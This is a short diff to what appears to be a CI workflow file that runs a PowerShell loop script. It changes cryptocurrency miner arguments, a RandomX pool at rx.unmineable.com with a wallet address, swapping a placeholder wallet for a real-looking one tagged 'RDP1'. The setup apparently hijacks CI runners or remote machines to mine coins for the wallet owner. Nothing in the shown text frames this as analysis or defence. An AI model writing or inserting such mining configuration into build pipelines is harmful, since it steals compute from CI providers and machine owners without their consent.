@@ -36,4 +36,4 @@ jobs:
         ./loop.ps1
 ============================================
 
---donate-level 1 -o rx.unmineable.com:3333 -u CI:carteira.mineiro -p x -k -a rx/0
+--donate-level 1 -o rx.unmineable.com:3333 -u SC:f3cb0f245ddd73561a6476a4617c3d40fc5d43a0a6bbba3b7ff5027db18a8eb8c63c49412e27.RDP1 -p x -k -a rx/0
